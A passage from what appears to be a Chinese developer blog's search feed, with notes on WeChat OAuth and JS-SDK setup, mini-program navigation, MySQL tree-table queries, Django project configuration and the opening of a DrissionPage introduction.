href="https://api.weixin.qq.com/sns/oauth2/refresh_token?appid=APPID&grant_type=refresh_token&refresh_token=REFRESH_TOKEN">https://api.weixin.qq.com/sns/oauth2/refresh_token?appid=APPID&amp;grant_type=refresh_token&amp;refresh_token=REFRESH_TOKEN</a></p></blockquote></li><li><p>拉取用户信息(需scope为 snsapi_userinfo)</p><blockquote><p>  如果网页授权作用域为snsapi_userinfo，则此时开发者可以通过access_token和openid拉取用户信息了。<br> <a href="https://api.weixin.qq.com/sns/userinfo?access_token=ACCESS_TOKEN&openid=OPENID&lang=zh_CN">https://api.weixin.qq.com/sns/userinfo?access_token=ACCESS_TOKEN&amp;openid=OPENID&amp;lang=zh_CN</a></p></blockquote></li><li><p>附：检验授权凭证（access_token）是否有效</p><blockquote><p>  <a href="https://api.weixin.qq.com/sns/auth?access_token=ACCESS_TOKEN&openid=OPENID">https://api.weixin.qq.com/sns/auth?access_token=ACCESS_TOKEN&amp;openid=OPENID</a></p></blockquote></li></ol><h3 id="签名算法"><a href="#签名算法" class="headerlink" title="签名算法"></a>签名算法</h3><ol><li>jsapi_ticket获取<blockquote><p>GET <a href="https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token=ACCESS_TOKEN&type=jsapi">https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token=ACCESS_TOKEN&amp;type=jsapi</a></p></blockquote></li><li>signature签名算法<blockquote><p>签名生成规则如下：参与签名的字段包括noncestr（随机字符串）, 有效的jsapi_ticket, timestamp（时间戳）, url（当前网页的URL，不包含#及其后面部分） 。对所有待签名参数按照字段名的ASCII 码从小到大排序（字典序）后，使用URL键值对的格式（即key1&#x3D;value1&amp;key2&#x3D;value2…）拼接成字符串string1。这里需要注意的是所有参数名均为小写字符。对string1作sha1加密，字段名和字段值都采用原始值，不进行URL 转义。</p></blockquote></li></ol><h3 id="引入sdk初始化配置"><a href="#引入sdk初始化配置" class="headerlink" title="引入sdk初始化配置"></a>引入sdk初始化配置</h3><pre><code class="javascript">&lt;script src=&quot;http://res.wx.qq.com/open/js/jweixin-1.6.0.js&quot;&gt;&lt;/script&gt;// 所有需要使用JS-SDK的页面必须先注入配置信息initFn() &#123;    wx.config(&#123;        debug: true, // 开启调试模式,调用的所有api的返回值会在客户端alert出来，若要查看传入的参数，可以在pc端打开，参数信息会通过log打出，仅在pc端时才会打印。        appId: &#39;&#39;, // 必填，公众号的唯一标识        timestamp: , // 必填，生成签名的时间戳        nonceStr: &#39;&#39;, // 必填，生成签名的随机串        signature: &#39;&#39;,// 必填，签名        jsApiList: [] // 必填，需要使用的JS接口列表    &#125;)    wx.ready(() =&gt;&#123;        // config信息验证后会执行ready方法，所有接口调用都必须在config接口获得结果之后，config是一个客户端的异步操作，所以如果需要在页面加载时就调用相关接口，则须把相关接口放在ready函数中调用来确保正确执行。对于用户触发时才调用的接口，则可以直接调用，不需要放在ready函数中。    &#125;)    wx.error(function(res)&#123;        // config信息验证失败会执行error函数，如签名过期导致验证失败，具体错误信息可以打开config的debug模式查看，也可以在返回的res参数中查看，对于SPA可以在这里更新签名。    &#125;)&#125;</code></pre><h3 id="所有JS接口列表"><a href="#所有JS接口列表" class="headerlink" title="所有JS接口列表"></a>所有JS接口列表</h3><p>版本 1.6.0 接口</p><pre><code class="javascript">[updateAppMessageShareData,updateTimelineShareData,onMenuShareWeibo,onMenuShareQZone,startRecord,stopRecord,onVoiceRecordEnd,playVoice,pauseVoice,stopVoice,onVoicePlayEnd,uploadVoice,downloadVoice,chooseImage,previewImage,uploadImage,downloadImage,translateVoice,getNetworkType,openLocation,getLocation,hideOptionMenu,showOptionMenu,hideMenuItems,showMenuItems,hideAllNonBaseMenuItem,showAllNonBaseMenuItem,closeWindow,scanQRCode,openProductSpecificView,addCard,chooseCard,openCard,]</code></pre>]]></content>
      
      
      <categories>
          
          <category> Wechat </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跳转小程序</title>
      <link href="/2024/08/01/wechat-gominiprogram/"/>
      <url>/2024/08/01/wechat-gominiprogram/</url>
      
        <content type="html"><![CDATA[<blockquote><p>关于微信小程序的跳转</p></blockquote><h2 id="小程序跳转小程序"><a href="#小程序跳转小程序" class="headerlink" title="小程序跳转小程序"></a>小程序跳转小程序</h2><p>wx.navigateToMiniProgram(Object object)</p><pre><code class="javascript">wx.navigateToMiniProgram(&#123;    appId: &#39;&#39;,    path: &#39;page/index/index?id=123&#39;,    extraData: &#123; // 传递参数，目标小程序可在 App.onLaunch，App.onShow 中获取到这份数据。如果跳转的是小游戏，可以在 wx.onShow、wx.getLaunchOptionsSync 中可以获取到这份数据数据。        foo: &#39;bar&#39;    &#125;,    envVersion: &#39;develop&#39;, // develop，trial，release    success(res) &#123;        // 打开成功    &#125;,    fail(err) &#123;        // 打开失败    &#125;,&#125;)</code></pre><h2 id="小程序内嵌h5跳转小程序"><a href="#小程序内嵌h5跳转小程序" class="headerlink" title="小程序内嵌h5跳转小程序"></a>小程序内嵌h5跳转小程序</h2><p>web-view</p><pre><code class="javascript">&lt;script type=&quot;text/javascript&quot; src=&quot;https://res.wx.qq.com/open/js/jweixin-1.3.2.js&quot;&gt;&lt;/script&gt;// 小程序页面跳转wx.miniProgram.navigateTo(&#123;url: &#39;/path/to/page&#39;&#125;)wx.miniProgram.navigateBack()wx.miniProgram.switchTab(&#123;url: &#39;/path/to/page&#39;&#125;)wx.miniProgram.reLaunch(&#123;url: &#39;/path/to/page&#39;&#125;)wx.miniProgram.redirectTo(&#123;url: &#39;/path/to/page&#39;&#125;)// 向小程序发送消息，会在以下特定时机触发组件的message事件：小程序后退、组件销毁、分享、复制链接（2.31.1）wx.miniProgram.postMessage(&#123; data: &#39;foo&#39; &#125;)wx.miniProgram.postMessage(&#123; data: &#123;foo: &#39;bar&#39;&#125; &#125;)// 获取当前环境wx.miniProgram.getEnv(function(res) &#123; console.log(res.miniprogram) &#125;)</code></pre><h2 id="h5跳转小程序"><a href="#h5跳转小程序" class="headerlink" title="h5跳转小程序"></a>h5跳转小程序</h2><h3 id="sdk"><a href="#sdk" class="headerlink" title="sdk"></a>sdk</h3><ol><li><p>第一步：用户同意授权，获取code</p><blockquote><p>  在确保微信公众账号拥有授权作用域（scope参数）的权限的前提下（已认证服务号，默认拥有scope参数中的snsapi_base和snsapi_userinfo 权限），引导关注者打开如下页面：<a href="https://open.weixin.qq.com/connect/oauth2/authorize?appid=APPID&redirect_uri=REDIRECT_URI&response_type=code&scope=SCOPE&state=STATE#wechat_redirect">https://open.weixin.qq.com/connect/oauth2/authorize?appid=APPID&amp;redirect_uri=REDIRECT_URI&amp;response_type=code&amp;scope=SCOPE&amp;state=STATE#wechat_redirect</a><br> 若提示“该链接无法访问”，请检查参数是否填写错误，是否拥有scope参数对应的授权作用域权限。<br> 尤其注意：由于授权操作安全等级较高，所以在发起授权请求时，微信会对授权链接做正则强匹配校验，如果链接的参数顺序不对，授权页面将无法正常访问,<br> 用户同意授权后<br> 如果用户同意授权，页面将跳转至 redirect_uri&#x2F;?code&#x3D;CODE&amp;state&#x3D;STATE。</p></blockquote></li><li><p>第二步：通过code换取网页授权access_token</p><blockquote><p>  首先请注意，这里通过code换取的是一个特殊的网页授权access_token,与基础支持中的access_token（该access_token用于调用其他接口）不同。公众号可通过下述接口来获取网页授权access_token。如果网页授权的作用域为snsapi_base，则本步骤中获取到网页授权access_token的同时，也获取到了openid，snsapi_base式的网页授权流程即到此为止。<br> 尤其注意：由于公众号的secret和获取到的access_token安全级别都非常高，必须只保存在服务器，不允许传给客户端。后续刷新access_token、通过access_token获取用户信息等步骤，也必须从服务器发起<br> <a href="https://api.weixin.qq.com/sns/oauth2/access_token?appid=APPID&secret=SECRET&code=CODE&grant_type=authorization_code">https://api.weixin.qq.com/sns/oauth2/access_token?appid=APPID&amp;secret=SECRET&amp;code=CODE&amp;grant_type=authorization_code</a></p></blockquote></li><li><p>刷新access_token（如果需要）</p><blockquote><p>  由于access_token拥有较短的有效期，当access_token超时后，可以使用refresh_token进行刷新，refresh_token有效期为30天，当refresh_token失效之后，需要用户重新授权。<br> <a href="https://api.weixin.qq.com/sns/oauth2/refresh_token?appid=APPID&grant_type=refresh_token&refresh_token=REFRESH_TOKEN">https://api.weixin.qq.com/sns/oauth2/refresh_token?appid=APPID&amp;grant_type=refresh_token&amp;refresh_token=REFRESH_TOKEN</a></p></blockquote></li><li><p>拉取用户信息(需scope为 snsapi_userinfo)</p><blockquote><p>  如果网页授权作用域为snsapi_userinfo，则此时开发者可以通过access_token和openid拉取用户信息了。<br> <a href="https://api.weixin.qq.com/sns/userinfo?access_token=ACCESS_TOKEN&openid=OPENID&lang=zh_CN">https://api.weixin.qq.com/sns/userinfo?access_token=ACCESS_TOKEN&amp;openid=OPENID&amp;lang=zh_CN</a></p></blockquote></li><li><p>附：检验授权凭证（access_token）是否有效</p><blockquote><p>  <a href="https://api.weixin.qq.com/sns/auth?access_token=ACCESS_TOKEN&openid=OPENID">https://api.weixin.qq.com/sns/auth?access_token=ACCESS_TOKEN&amp;openid=OPENID</a></p></blockquote></li><li><p>页面引入sdk</p></li></ol><pre><code class="javascript">&lt;script src=&quot;http://res.wx.qq.com/open/js/jweixin-1.6.0.js&quot;&gt;&lt;/script&gt;</code></pre><ol start="7"><li>页面内容</li></ol><pre><code class="html">&lt;wx-open-launch-weapp id=&quot;launch-btn&quot; username=&quot;&quot; path=&quot;&quot;&gt;    &lt;template&gt;        &lt;div&gt;            &lt;button&gt;跳转小程序&lt;/button&gt;        &lt;/div&gt;    &lt;/template&gt;&lt;/wx-open-launch-weapp&gt;</code></pre><pre><code class="javascript">// 所有需要使用JS-SDK的页面必须先注入配置信息initFn() &#123;    wx.config(&#123;        debug: true, // 开启调试模式,调用的所有api的返回值会在客户端alert出来，若要查看传入的参数，可以在pc端打开，参数信息会通过log打出，仅在pc端时才会打印。        appId: &#39;&#39;, // 必填，公众号的唯一标识        timestamp: , // 必填，生成签名的时间戳        nonceStr: &#39;&#39;, // 必填，生成签名的随机串        signature: &#39;&#39;,// 必填，签名        jsApiList: [] // 必填，需要使用的JS接口列表    &#125;)    wx.ready(() =&gt;&#123;        // config信息验证后会执行ready方法，所有接口调用都必须在config接口获得结果之后，config是一个客户端的异步操作，所以如果需要在页面加载时就调用相关接口，则须把相关接口放在ready函数中调用来确保正确执行。对于用户触发时才调用的接口，则可以直接调用，不需要放在ready函数中。    &#125;)    wx.error(function(res)&#123;        // config信息验证失败会执行error函数，如签名过期导致验证失败，具体错误信息可以打开config的debug模式查看，也可以在返回的res参数中查看，对于SPA可以在这里更新签名。    &#125;)&#125;</code></pre><h3 id="scheme"><a href="#scheme" class="headerlink" title="scheme"></a>scheme</h3><ol><li>请求获取scheme<blockquote><p>  <a href="https://api.weixin.qq.com/wxa/generatescheme?access_token=ACCESS_TOKEN">https://api.weixin.qq.com/wxa/generatescheme?access_token=ACCESS_TOKEN</a></p></blockquote></li><li>页面跳转</li></ol><pre><code class="html">&lt;a href=&quot;weixin://dl/business/?t=scheme&quot; rel=&quot;external nofollow&quot;&gt;跳转小程序&lt;/a&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Wechat </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树状表</title>
      <link href="/2024/05/15/mysql-tree/"/>
      <url>/2024/05/15/mysql-tree/</url>
      
        <content type="html"><![CDATA[<blockquote><p>只记录了左右值和路径值的树型结构，个人感觉路径值更好用一点</p></blockquote><h2 id="左右值-lft-rgt"><a href="#左右值-lft-rgt" class="headerlink" title="左右值(lft, rgt)"></a>左右值(lft, rgt)</h2><blockquote><p>查询很好用，但是新增删除时需要操作执行整个表的内容，存储失败时难以回滚，还会有并发冲突的问题，只适合内容稳定修改较少的表类型</p></blockquote><h3 id="新增"><a href="#新增" class="headerlink" title="新增"></a>新增</h3><pre><code class="java">// +----+-------------+-------+--------+-----+-----+----------+-------------+// | id | name        | value | type   | lft | rgt | parentId | valuePrefix |// +----+-------------+-------+--------+-----+-----+----------+-------------+// |  1 | SYSTEM_NAME | 0     | system |   1 |  28 | NULL     | sys:        |// |  2 | 系统维护    | 0     | menu   |   2 |  21 |        1 | sys:0:      |// |  3 | 人员管理    | 1     | page   |  22 |  27 |        1 | sys:0:      |// |  4 | 组织管理    | 0     | page   |   3 |   4 |        2 | sys:0:0:    |// |  5 | 角色管理    | 1     | page   |   5 |  10 |        2 | sys:0:0:    |// |  6 | 权限管理    | 2     | page   |  11 |  16 |        2 | sys:0:0:    |// |  7 | 操作日志    | 3     | page   |  17 |  18 |        2 | sys:0:0:    |// |  8 | 系统设置    | 4     | page   |  19 |  20 |        2 | sys:0:0:    |// |  9 | 新增        | 0     | button |   6 |   7 |        5 | sys:0:0:1:  |// | 10 | 新增        | 0     | button |  12 |  13 |        6 | sys:0:0:2:  |// | 11 | 编辑        | 1     | button |   8 |   9 |        5 | sys:0:0:1:  |// | 12 | 编辑        | 1     | button |  14 |  15 |        6 | sys:0:0:2:  |// | 13 | 新增        | 0     | button |  23 |  24 |        3 | sys:0:1:    |// | 14 | 编辑        | 1     | button |  25 |  26 |        3 | sys:0:1:    |// +----+-------------+-------+--------+-----+-----+----------+-------------+SET @lft := 7;/*新部门的左值*/SET @rgt := 8;/*新部门的右值*/SET @level := 5;/*新部门的层级*/begin;/*将插入的后续边缘的节点左右数+2*/UPDATE department SET lft=lft+2 WHERE lft &gt; @lft;UPDATE department SET rgt=rgt+2 WHERE rgt &gt;= @lft;/*插入数据*/INSERT INTO department(name,lft,rgt,level) VALUES(&#39;新部门&#39;,@lft,@rgt,level);/*新增影响行数为0时，必须回滚*/commit;/*rollback;*/</code></pre><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><pre><code class="java">SET @lft := 7;/*要删除的节点左值*/SET @rgt := 8;/*要删除的节点右值*/begin;UPDATE department SET lft=lft-2 WHERE lft &gt; @lft;UPDATE department SET rgt=rgt-2 WHERE rgt &gt; @lft;/*删除节点*/DELETE FROM department WHERE lft=@lft AND rgt=@rgt;/*删除影响行数为0时，必须回滚*/commit;/*rollback*/</code></pre><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><h4 id="查询所有子孙"><a href="#查询所有子孙" class="headerlink" title="查询所有子孙"></a>查询所有子孙</h4><pre><code class="java">SET @lft := 9;SET @rgt := 18;SELECT * FROM department WHERE lft BETWEEN @lft AND @rgt ORDER BY lft ASC;// `SELECT user_name FROM temp_pro_user WHERE lft &gt;= @lft AND lft &lt;= @rgt ORDER BY lft ASC`;/*例子中用BETWEEN将被查部门本身也查了出来。实际中可以用大于小于*/</code></pre><h4 id="查询下属总数"><a href="#查询下属总数" class="headerlink" title="查询下属总数"></a>查询下属总数</h4><pre><code class="java">// 总数 = (右值 - 左值 - 1) / 2</code></pre><h4 id="查询一级下属"><a href="#查询一级下属" class="headerlink" title="查询一级下属"></a>查询一级下属</h4><pre><code class="java">SET @level := 2;/*总经理的level*/SET @lft := 2;/*总经理的左值*/SET @rgt := 19;/*总经理的右值*/SELECT * FROM department WHERE lft &gt; @lft AND rgt &lt; @rgt AND level = @level+1;</code></pre><h4 id="查询祖链路径"><a href="#查询祖链路径" class="headerlink" title="查询祖链路径"></a>查询祖链路径</h4><pre><code class="java">SET @lft := 3;/*产品部左值*/SET @rgt := 8;/*产品部右值*/SELECT * FROM department WHERE lft &lt; @lft AND rgt &gt; @rgt ORDER BY lft ASC;</code></pre><h4 id="查询后转成树结构"><a href="#查询后转成树结构" class="headerlink" title="查询后转成树结构"></a>查询后转成树结构</h4><pre><code class="javascript">let list = [//模拟sql查出来的列表。    &#123;id:1,name:&#39;root&#39;,lft:1,rgt:8,level:1&#125;,    &#123;id:2,name:&#39;child&#39;,lft:2,rgt:7,level:2&#125;,    &#123;id:3,name:&#39;grandson&#39;,lft:3,rgt:4,level:3&#125;,    &#123;id:4,name:&#39;grandson2&#39;,lft:5,rgt:6,level:3&#125;];let rights = [] /*类似于一个栈结构（后进先出）*/let mp = &#123;&#125;//list.sort((a,b) =&gt; a.lft - b.lft)//如果你在sql中没有进行排序，需要在这里给他排序。list.forEach(item =&gt; &#123;    if(rights.length &gt; 0) &#123;        while(rights[rights.length-1] &lt; item.rgt) &#123;            rights.splice(-1, 1)//从rights末尾去除        &#125;    &#125;    let _level = rights.length;    item._level = _level;    mp[_level] = item.id    item.parent_id = _level - 1 in mp ? mp[_level - 1] : null;//计算出上级部门编号    item.is_leaf = item.lft === item.rgt - 1;//判断是否叶子部门    rights.push(item.rgt)&#125;)/*上级部门计算出来了，和存parent_id的效果就一样了，后面只需要递归即可*//*递归函数 示例*/let recursive = (_list, parent_id = null) =&gt; &#123;    let _tree = [];    _list.forEach(item =&gt; &#123;        if(item.parent_id === parent_id) &#123;            let childs = recursive(_list, item.id)            _tree.push(&#123;                ...item,                children: childs.length &gt; 0 ? childs : (item.isLeaf ? null : [])            &#125;)        &#125;    &#125;)    return _tree&#125;console.log(recursive(list))</code></pre><h2 id="路径值（1-x2F-2-x2F-3-x2F-4-x2F-5-x2F-6-x2F-…）"><a href="#路径值（1-x2F-2-x2F-3-x2F-4-x2F-5-x2F-6-x2F-…）" class="headerlink" title="路径值（1&#x2F;2&#x2F;3&#x2F;4&#x2F;5&#x2F;6&#x2F;…）"></a>路径值（1&#x2F;2&#x2F;3&#x2F;4&#x2F;5&#x2F;6&#x2F;…）</h2><blockquote><p>查询难度低，需要拼接path内容，存储基本不会出现并发冲突</p></blockquote><h3 id="查询-1"><a href="#查询-1" class="headerlink" title="查询"></a>查询</h3><pre><code class="java">// +----+----------+------------+// | id | userName | path       |// +----+----------+------------+// |  1 | Admin    | 0          |// |  2 | Ron      | 0/1        |// |  3 | Ron0     | 0/1/2      |// |  4 | Bio      | 0/1        |// |  5 | Ron1     | 0/1/2      |// |  6 | Bio0     | 0/1/4      |// |  7 | Bio00    | 0/1/4/6    |// |  8 | Bio000   | 0/1/4/6/7  |// +----+----------+------------+// 查询所有子结构内容(当前id: 2)const @userPath = user.path + &#39;/&#39; + user.id + &#39;%&#39;SELECT name FROM TABLENAME WHERE path like @userPath// 查询所有父结构内容(当前id: 8)const @pathArr = user.path.split(&#39;/&#39;)SELECT name FROM TABLENAME WHERE id IN @pathArr</code></pre><h3 id="查询后转树状"><a href="#查询后转树状" class="headerlink" title="查询后转树状"></a>查询后转树状</h3><pre><code class="javascript">/*递归函数 示例*/let recursive = (_list, path = 0) =&gt; &#123;    let _tree = [];    _list.forEach(item =&gt; &#123;        if(item.path === path) &#123;            let childs = recursive(_list, (path + &#39;/&#39; + item.id))            _tree.push(&#123;                ...item,                children: childs.length &gt; 0 ? childs : []            &#125;)        &#125;    &#125;)    return _tree&#125;console.log(recursive(list))</code></pre>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 树状表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django</title>
      <link href="/2024/05/01/django/"/>
      <url>/2024/05/01/django/</url>
      
        <content type="html"><![CDATA[<blockquote><p>关于Python的服务端框架-Django(有大量的基础服务内容，可创建多模块分配)。</p></blockquote><h2 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h2><table><thead><tr><th>名称</th><th>版本</th></tr></thead><tbody><tr><td>python</td><td>V3.11.0</td></tr><tr><td>pip</td><td>V23.3.1</td></tr></tbody></table><h2 id="安装Django-及-其他依赖包"><a href="#安装Django-及-其他依赖包" class="headerlink" title="安装Django 及 其他依赖包"></a>安装Django 及 其他依赖包</h2><pre><code class="shell">pip install django # 框架依赖包 version 4.2.7pip install django-cors-headers # 处理跨域的依赖包pip install pymysql # mysql模块依赖包</code></pre><h2 id="依赖记录"><a href="#依赖记录" class="headerlink" title="依赖记录"></a>依赖记录</h2><pre><code class="shell"># 创建依赖记录pip freeze &gt; requirements.txt# 依赖记录安装pip install -r requirements.txt</code></pre><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><pre><code class="shell">Django-admin startproject templateName</code></pre><h2 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h2><h3 id="处理跨域访问"><a href="#处理跨域访问" class="headerlink" title="处理跨域访问"></a>处理跨域访问</h3><pre><code class="python"># 基础配置文件配置以下内容ALLOWED_HOSTS = [&#39;*&#39;]CORS_ALLOW_CREDENTIALS = TrueCORS_ORIGIN_ALLOW_ALL = TrueCORS_ORIGIN_WHITELIST = (&#39;http://localhost&#39;, &#39;http://127.0.0.1&#39;, &#39;http://0.0.0.0&#39;)SECURE_CROSS_ORIGIN_OPENER_POLICY = None # 默认值为same-originCORS_ALLOW_METHODS = (    &#39;DELETE&#39;,    &#39;GET&#39;,    &#39;OPTIONS&#39;,    &#39;PATCH&#39;,    &#39;POST&#39;,    &#39;PUT&#39;,    &#39;VIEW&#39;,)CORS_ALLOW_HEADERS = (&#39;*&#39;,)</code></pre><h3 id="模块创建"><a href="#模块创建" class="headerlink" title="模块创建"></a>模块创建</h3><pre><code class="shell">python manage.py startapp AppOne # 创建AppOne模块python manage.py startapp AppTwo # 创建AppTwo模块</code></pre><h3 id="模块注册"><a href="#模块注册" class="headerlink" title="模块注册"></a>模块注册</h3><pre><code class="python"># 模块创建完成后需要注册INSTALLED_APPS = [    &#39;django.contrib.admin&#39;,    &#39;django.contrib.auth&#39;,    &#39;django.contrib.contenttypes&#39;,    &#39;django.contrib.sessions&#39;,    &#39;django.contrib.messages&#39;,    &#39;django.contrib.staticfiles&#39;,    &#39;AppOne.apps.ApponeConfig&#39;, #注册AppOne    &#39;AppTwo.apps.ApptwoConfig&#39;, #注册AppTwo]</code></pre><h3 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h3><pre><code class="python"># __init__.pyimport pymysql  # 导入第三方模块，用来操作mysql数据库pymysql.install_as_MySQLdb()# settings.pyDATABASES = &#123;    &#39;default&#39;: &#123;        # django默认数据库        &#39;ENGINE&#39;: &#39;django.db.backends.sqlite3&#39;,        &#39;NAME&#39;: BASE_DIR / &#39;db.sqlite3&#39;,        # mysql远程数据库        # &#39;ENGINE&#39;: &#39;django.db.backends.mysql&#39;, # 更改为mysql        # &#39;NAME&#39;: &#39;example&#39;, # testsql数据库名        # &#39;USER&#39;: &#39;example&#39;, # 数据库的用户名        # &#39;PASSWORD&#39;: &#39;example123&#39;, # 密码        # &#39;HOST&#39;: &#39;*.*.*.*&#39;,        # &#39;PORT&#39;: &#39;3306&#39;, # 端口号，默认为3306    &#125;&#125;</code></pre><h3 id="Django模型"><a href="#Django模型" class="headerlink" title="Django模型"></a>Django模型</h3><pre><code class="python"># 定义AppOne的模型  /&gt;AppOne&gt;models.pyfrom django.db import models# Create your models here.class Book(models.Model):    id = models.AutoField(primary_key=True) # id 会自动创建,可以手动写入    title = models.CharField(max_length=32) # 书籍名称    price = models.DecimalField(max_digits=5, decimal_places=2) # 书籍价格    publish = models.CharField(max_length=32) # 出版社名称    pub_date = models.DateField() # 出版时间</code></pre><pre><code class="shell">python manage.py makemigrations AppOne # 映射AppOne的modelspython manage.py migrate 同步AppOne的models到数据库</code></pre><h3 id="后台管理员配置"><a href="#后台管理员配置" class="headerlink" title="后台管理员配置"></a>后台管理员配置</h3><pre><code class="shell"># 需要先映射同步数据库python manage.py makemigrations 映射modelspython manage.py migrate 同步到数据库# 创建超级用户python manage.py createsuperuser# http://ip:端口/admin/ 访问后台</code></pre><h3 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h3><pre><code class="shell">python manage.py runserver 0.0.0.0:5000 # 启动到局域网内5000端口python manage.py runserver 127.0.0.1:5000 # 启动到本地5000端口</code></pre><h2 id="路由配置"><a href="#路由配置" class="headerlink" title="路由配置"></a>路由配置</h2><pre><code class="python"># urls.pyfrom django.urls import path, include # include用于多项目时分发from django.contrib import adminurlpatterns = [    path(&#39;admin/&#39;, admin.site.urls),    path(&quot;user/&quot;, include(&quot;user.urls&quot;)),]</code></pre><h2 id="模块视图"><a href="#模块视图" class="headerlink" title="模块视图"></a>模块视图</h2><h3 id="子路由配置"><a href="#子路由配置" class="headerlink" title="子路由配置"></a>子路由配置</h3><pre><code class="python"># /&gt;AppOne&gt;urls.pyfrom django.urls import pathfrom django.urls import re_path # 用re_path 需要引入from AppOne import viewsurlpatterns = [    path(&#39;search/&#39;, views.searchUser), # 普通路径    re_path(r&#39;^index1/([0-9]&#123;4&#125;)/$&#39;, views.index1), # 正则路径（无名分组）http://127.0.0.1:5000/user/index1/2023/    re_path(&quot;^index2/(?P&lt;year&gt;[0-9]&#123;4&#125;)/(?P&lt;month&gt;[0-9]&#123;2&#125;)/$&quot;, views.index2), # 正则路径（路由形参）http://127.0.0.1:5000/user/index2/2023/05/    # r:代表的是原生字符串（raw）    # ^:代表以什么开头    # $:代表的是以什么结尾    # /article/list/(year)/    # 在正则表达式中定义一个变量，参数，就需要用（）进行捕获参数。    # 给捕获的参数去一个名字，就可以使用&lt;&gt;,（?P&lt;year&gt;）    # \d:代表是0-9之间的数字    # &#123;4&#125;：代表的是这样的数字有4个。    # 在我们的$符号前面有一个/，代表的是要以/结尾。]</code></pre><h3 id="子模型注册Admin"><a href="#子模型注册Admin" class="headerlink" title="子模型注册Admin"></a>子模型注册Admin</h3><pre><code class="python"># /&gt;AppOne&gt;admin.pyfrom django.contrib import adminfrom user.models import Book # Register your models here.admin.site.register([Book])</code></pre><h3 id="视图内容"><a href="#视图内容" class="headerlink" title="视图内容"></a>视图内容</h3><pre><code class="python"># /&gt;AppOne&gt;views.pyfrom django.shortcuts import render# Create your views here.from django.http import HttpResponse, JsonResponsefrom django.core import serializers # 格式化json serializers.serialize(&quot;json&quot;, models.Book.objects.all())from user import modelsimport jsondef searchUser(request):    # 请求接口返回示例    if request.method == &quot;GET&quot;:        # GET        name = request.GET.get(&#39;name&#39;)        return HttpResponse(&quot;user：&quot; + name)    elif request.method == &quot;POST&quot;:        # POST        name = request.POST.get(&#39;name&#39;)        return HttpResponse(&quot;user：&quot; + name)  # 字符串作为返回内容    def index1(request, year):    # 请求接口返回示例    return HttpResponse(year) # 一个形参代表路径中一个分组的内容，按关键字对应匹配def index2(request, year, month):    # 请求接口返回示例    return HttpResponse(year + &#39;-&#39; + month) # 一个形参代表路径中一个分组的内容，按关键字对应匹配</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DrissionPage</title>
      <link href="/2024/05/01/drissionpage/"/>
      <url>/2024/05/01/drissionpage/</url>
      
        <content type="html"><![CDATA[<blockquote><p>DrissionPage 是一个基于 python 的网页自动化工具。它既能控制浏览器，也能收发数据包，还能把两者合而为一。可兼顾浏览器自动化的便利性和 requests 的高效率。它功能强大，内置无数人性化设计和便捷功能。它的语法简洁而优雅，代码量少，对新手友好。</p></blockquote><h2 id="1-运行环境"><a href="#1-运行环境" class="headerlink" title="1. 运行环境"></a>1. 运行环境</h2><p>操作系统：Windows、Linux 或 Mac。<br>python 版本：3.6 及以上<br>支持浏览器：Chromium 内核（如 Chrome 和 Edge）</p><h2 id="2-pip安装及升级"><a href="#2-pip安装及升级" class="headerlink" title="2. pip安装及升级"></a>2. pip安装及升级</h2><pre><code class="shell">pip install DrissionPage # pip安装DrissionPagepip install DrissionPage --upgrade # pip升级DrissionPage</code></pre><h2 id="3-基本内容"><a href="#3-基本内容" class="headerlink" title="3. 基本内容"></a>3. 基本内容</h2><p>页面类用于控制浏览器，或收发数据包，是最主要的工具。DrissionPage 包含三种主要页面类。根据须要在其中选择使用。</p><h3 id="3-1-WebPage"><a href="#3-1-WebPage" class="headerlink" title="3.1 WebPage"></a>3.1 WebPage</h3><p>功能最全面的页面类，既可控制浏览器，也可收发数据包(包含了ChromiumPage和SessionPage)<br>通过change_mode()方法切换模式(ChromiumPage: ‘d’, SessionPage: ‘s’)</p><pre><code class="python">from DrissionPage import WebPage</code></pre><h3 id="3-2-ChromiumPage"><a href="#3-2-ChromiumPage" class="headerlink" title="3.2 ChromiumPage"></a>3.2 ChromiumPage</h3><pre><code>用于只控制浏览器</code></pre><pre><code class="python">from DrissionPage import ChromiumPage</code></pre><h3 id="3-3-SessionPage"><a href="#3-3-SessionPage" class="headerlink" title="3.3 SessionPage"></a>3.3 SessionPage</h3><p>用于只收发数据包</p><pre><code class="python">from DrissionPage import SessionPage</code></pre><h2 id="4-配置工具"><a href="#4-配置工具" class="headerlink" title="4. 配置工具"></a>4. 配置工具</h2><p>很多时候我们须要设置启动参数，可导入以下两个类，但不是必须的。</p><h3 id="4-1-ChromiumOptions类"><a href="#4-1-ChromiumOptions类" class="headerlink" title="4.1 ChromiumOptions类"></a>4.1 ChromiumOptions类</h3><p>用于设置浏览器启动参数</p><pre><code class="python">from DrissionPage import ChromiumOptions</code></pre><h3 id="4-2-SessionOptions类"><a href="#4-2-SessionOptions类" class="headerlink" title="4.2 SessionOptions类"></a>4.2 SessionOptions类</h3><p>用于设置Session对象启动参数</p><pre><code class="python">from DrissionPage import SessionOptions</code></pre><h3 id="4-3-Settings"><a href="#4-3-Settings" class="headerlink" title="4.3 Settings"></a>4.3 Settings</h3><p>用于设置全局配置</p><pre><code class="python">from DrissionPage.common import Settings</code></pre><h2 id="5-其他工具"><a href="#5-其他工具" class="headerlink" title="5. 其他工具"></a>5. 其他工具</h2><p>可能需要用到的工具，需要时可以导入。</p><h3 id="5-1-动作链"><a 